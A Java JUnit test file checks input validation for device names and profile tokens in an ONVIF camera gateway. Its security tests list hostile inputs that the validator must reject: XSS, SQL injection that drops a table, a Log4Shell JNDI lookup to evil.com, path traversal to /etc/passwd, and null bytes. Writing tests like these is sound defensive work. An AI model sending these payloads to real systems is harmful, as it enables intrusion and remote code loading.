package com.onvif.driver.gateway.util;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.NullAndEmptySource;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.*;

/**
 * Unit tests for ValidationUtil.
 * Tests input validation methods for device names and profile tokens.
 */
class ValidationUtilTest {

    // ==================== Device Name Validation Tests ====================

    @Test
    void testValidDeviceName_ValidInputs() {
        // Valid alphanumeric names
        assertThat(ValidationUtil.isValidDeviceName("Camera1")).isTrue();
        assertThat(ValidationUtil.isValidDeviceName("camera123")).isTrue();
        assertThat(ValidationUtil.isValidDeviceName("CAMERA")).isTrue();

        // Valid with underscores
        assertThat(ValidationUtil.isValidDeviceName("Front_Camera")).isTrue();
        assertThat(ValidationUtil.isValidDeviceName("camera_1_main")).isTrue();

        // Valid with hyphens
        assertThat(ValidationUtil.isValidDeviceName("Front-Camera")).isTrue();
        assertThat(ValidationUtil.isValidDeviceName("camera-1-main")).isTrue();

        // Valid with spaces (Ignition device names commonly include spaces)
        assertThat(ValidationUtil.isValidDeviceName("Camera 1")).isTrue();
        assertThat(ValidationUtil.isValidDeviceName("Front Camera")).isTrue();
        assertThat(ValidationUtil.isValidDeviceName("Side Entry Camera")).isTrue();

        // Valid mixed
        assertThat(ValidationUtil.isValidDeviceName("Camera-1_Main")).isTrue();
        assertThat(ValidationUtil.isValidDeviceName("CAM_123-ABC")).isTrue();

        // Single character
        assertThat(ValidationUtil.isValidDeviceName("A")).isTrue();
        assertThat(ValidationUtil.isValidDeviceName("1")).isTrue();

        // Maximum length (64 characters)
        String maxLengthName = "A".repeat(64);
        assertThat(ValidationUtil.isValidDeviceName(maxLengthName)).isTrue();
    }

    @ParameterizedTest
    @NullAndEmptySource
    @ValueSource(strings = {" ", "  ", "\t", "\n"})
    void testValidDeviceName_NullEmptyOrWhitespace(String input) {
        assertThat(ValidationUtil.isValidDeviceName(input)).isFalse();
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "Camera!",            // Special character
        "Camera@Home",        // @ not allowed
        "Camera#1",           // # not allowed
        "Camera$1",           // $ not allowed
        "Camera%1",           // % not allowed
        "Camera&1",           // & not allowed
        "Camera*1",           // * not allowed
        "Camera(1)",          // Parentheses not allowed
        "Camera[1]",          // Brackets not allowed
        "Camera{1}",          // Braces not allowed
        "Camera/1",           // Slash not allowed
        "Camera\\1",          // Backslash not allowed
        "Camera.1",           // Dot not allowed
        "Camera,1",           // Comma not allowed
        "Camera;1",           // Semicolon not allowed
        "Camera:1",           // Colon not allowed
        "Camera'1",           // Quote not allowed
        "Camera\"1",          // Double quote not allowed
        "Camera<1>",          // Angle brackets not allowed
        "Camera=1",           // Equals not allowed
        "Camera+1",           // Plus not allowed
        "Camera?1",           // Question mark not allowed
        "../Camera",          // Path traversal attempt
        "Camera/../other",    // Path traversal attempt
    })
    void testValidDeviceName_InvalidCharacters(String input) {
        assertThat(ValidationUtil.isValidDeviceName(input)).isFalse();
    }

    @Test
    void testValidDeviceName_TooLong() {
        // 65 characters (exceeds max of 64)
        String tooLongName = "A".repeat(65);
        assertThat(ValidationUtil.isValidDeviceName(tooLongName)).isFalse();

        // 100 characters
        String veryLongName = "A".repeat(100);
        assertThat(ValidationUtil.isValidDeviceName(veryLongName)).isFalse();
    }

    // ==================== Profile Token Validation Tests ====================

    @Test
    void testValidProfileToken_ValidInputs() {
        // Valid alphanumeric tokens
        assertThat(ValidationUtil.isValidProfileToken("000")).isTrue();
        assertThat(ValidationUtil.isValidProfileToken("Profile1")).isTrue();
        assertThat(ValidationUtil.isValidProfileToken("profile123")).isTrue();
        assertThat(ValidationUtil.isValidProfileToken("PROFILE")).isTrue();

        // Valid with underscores
        assertThat(ValidationUtil.isValidProfileToken("Main_Profile")).isTrue();
        assertThat(ValidationUtil.isValidProfileToken("profile_1_hd")).isTrue();

        // Valid with hyphens
        assertThat(ValidationUtil.isValidProfileToken("Main-Profile")).isTrue();
        assertThat(ValidationUtil.isValidProfileToken("profile-1-hd")).isTrue();

        // Valid mixed
        assertThat(ValidationUtil.isValidProfileToken("Profile-1_HD")).isTrue();
        assertThat(ValidationUtil.isValidProfileToken("PROF_123-ABC")).isTrue();

        // Single character
        assertThat(ValidationUtil.isValidProfileToken("0")).isTrue();
        assertThat(ValidationUtil.isValidProfileToken("A")).isTrue();

        // Maximum length (64 characters)
        String maxLengthToken = "0".repeat(64);
        assertThat(ValidationUtil.isValidProfileToken(maxLengthToken)).isTrue();
    }

    @ParameterizedTest
    @NullAndEmptySource
    @ValueSource(strings = {" ", "  ", "\t", "\n"})
    void testValidProfileToken_NullEmptyOrWhitespace(String input) {
        assertThat(ValidationUtil.isValidProfileToken(input)).isFalse();
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "Profile 1",          // Space not allowed
        "Profile!",           // Special character
        "Profile@1",          // @ not allowed
        "Profile#1",          // # not allowed
        "Profile$1",          // $ not allowed
        "Profile%1",          // % not allowed
        "Profile&1",          // & not allowed
        "Profile*1",          // * not allowed
        "Profile(1)",         // Parentheses not allowed
        "Profile[1]",         // Brackets not allowed
        "Profile{1}",         // Braces not allowed
        "Profile/1",          // Slash not allowed
        "Profile\\1",         // Backslash not allowed
        "Profile.1",          // Dot not allowed
        "../Profile",         // Path traversal attempt
    })
    void testValidProfileToken_InvalidCharacters(String input) {
        assertThat(ValidationUtil.isValidProfileToken(input)).isFalse();
    }

    @Test
    void testValidProfileToken_TooLong() {
        // 65 characters (exceeds max of 64)
        String tooLongToken = "0".repeat(65);
        assertThat(ValidationUtil.isValidProfileToken(tooLongToken)).isFalse();

        // 100 characters
        String veryLongToken = "0".repeat(100);
        assertThat(ValidationUtil.isValidProfileToken(veryLongToken)).isFalse();
    }

    // ==================== RequireValid Methods Tests ====================

    @Test
    void testRequireValidDeviceName_ValidInput() {
        assertThatCode(() -> ValidationUtil.requireValidDeviceName("Camera1"))
            .doesNotThrowAnyException();

        assertThatCode(() -> ValidationUtil.requireValidDeviceName("Front-Camera_1"))
            .doesNotThrowAnyException();
    }

    @ParameterizedTest
    @NullAndEmptySource
    @ValueSource(strings = {" ", "Camera!", "../Camera"})
    void testRequireValidDeviceName_InvalidInput(String input) {
        assertThatThrownBy(() -> ValidationUtil.requireValidDeviceName(input))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("Invalid device name format");
    }

    @Test
    void testRequireValidProfileToken_ValidInput() {
        assertThatCode(() -> ValidationUtil.requireValidProfileToken("000"))
            .doesNotThrowAnyException();

        assertThatCode(() -> ValidationUtil.requireValidProfileToken("Profile-1_HD"))
            .doesNotThrowAnyException();
    }

    @ParameterizedTest
    @NullAndEmptySource
    @ValueSource(strings = {" ", "Profile 1", "Profile!", "../Profile"})
    void testRequireValidProfileToken_InvalidInput(String input) {
        assertThatThrownBy(() -> ValidationUtil.requireValidProfileToken(input))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("Invalid profile token format");
    }

    // ==================== Getter Methods Tests ====================

    @Test
    void testGetMaxDeviceNameLength() {
        assertThat(ValidationUtil.getMaxDeviceNameLength()).isEqualTo(64);
    }

    @Test
    void testGetMaxProfileTokenLength() {
        assertThat(ValidationUtil.getMaxProfileTokenLength()).isEqualTo(64);
    }

    // ==================== Constructor Test ====================

    @Test
    void testConstructor_ThrowsException() {
        // ValidationUtil should not be instantiable (utility class)
        assertThatThrownBy(() -> {
            java.lang.reflect.Constructor<ValidationUtil> constructor =
                ValidationUtil.class.getDeclaredConstructor();
            constructor.setAccessible(true);
            constructor.newInstance();
        })
        .hasCauseInstanceOf(UnsupportedOperationException.class)
        .getCause()
        .hasMessageContaining("ValidationUtil is a utility class and cannot be instantiated");
    }

    // ==================== Security Tests ====================

    @ParameterizedTest
    @ValueSource(strings = {
        "<script>alert('xss')</script>",
        "'; DROP TABLE devices; --",
        "${jndi:ldap://evil.com/a}",
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "%00",                          // Null byte
        "\u0000Camera",                 // Unicode null
    })
    void testValidDeviceName_SecurityThreats(String maliciousInput) {
        // These should all be rejected by the validation
        assertThat(ValidationUtil.isValidDeviceName(maliciousInput)).isFalse();
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "<script>alert('xss')</script>",
        "'; DROP TABLE profiles; --",
        "${jndi:ldap://evil.com/a}",
        "../../../etc/passwd",
        "%00",                          // Null byte
    })
    void testValidProfileToken_SecurityThreats(String maliciousInput) {
        // These should all be rejected by the validation
        assertThat(ValidationUtil.isValidProfileToken(maliciousInput)).isFalse();
    }

    // ==================== Edge Cases ====================

    @Test
    void testValidation_UnicodeCharacters() {
        // Unicode characters should be rejected (only ASCII allowed)
        assertThat(ValidationUtil.isValidDeviceName("Camera\u00E9")).isFalse();  // é
        assertThat(ValidationUtil.isValidDeviceName("Camera\u4E2D")).isFalse();  // 中
        assertThat(ValidationUtil.isValidProfileToken("Profile\u00E9")).isFalse();
    }

    @Test
    void testValidation_LeadingTrailingWhitespace() {
        // Leading/trailing whitespace should cause validation to fail
        assertThat(ValidationUtil.isValidDeviceName(" Camera1")).isFalse();
        assertThat(ValidationUtil.isValidDeviceName("Camera1 ")).isFalse();
        assertThat(ValidationUtil.isValidDeviceName(" Camera1 ")).isFalse();

        assertThat(ValidationUtil.isValidProfileToken(" Profile1")).isFalse();
        assertThat(ValidationUtil.isValidProfileToken("Profile1 ")).isFalse();
        assertThat(ValidationUtil.isValidProfileToken(" Profile1 ")).isFalse();
    }
}
